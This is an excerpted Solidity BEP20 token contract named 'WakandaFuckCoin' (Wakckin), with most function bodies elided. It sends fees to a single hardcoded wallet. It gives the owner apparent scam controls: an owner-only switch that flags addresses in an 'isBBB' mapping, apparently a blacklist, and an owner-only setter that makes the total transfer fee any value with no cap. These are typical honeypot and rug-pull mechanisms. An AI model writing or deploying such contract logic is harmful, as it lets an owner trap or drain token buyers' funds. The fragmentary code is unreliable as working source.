...
contract Wakckin is IBEP20, Auth {
    ...
    string constant _name = "WakandaFuckCoin";
    string constant _symbol = "Wakckin";
    ...
    address private marketingFeeReceiver = 0x7629a3C18922a101c287D40e713102F415196C92;
    address private buybackFeeReceiver = 0x7629a3C18922a101c287D40e713102F415196C92;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Wakckin seems to happen Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Wakckin seems to happen Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Wakckin Transfer seems to happen amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Wakckin TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "Wakckin receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value : amountBNBbuyback, gas : 30000}("");
        require(BuyBackSuccess, "Wakckin receiver rejected ETH transfer");
    ...
    function setDLWakckin(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDEWakckin(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignTokenWakckin(address _token) public authorized {
        require(_token != address(this), "Wakckin Can't let you take all native token");
    ...
    function isOverLiquifiedWakckin(uint256 target, uint256 accuracy) public view returns (bool) {
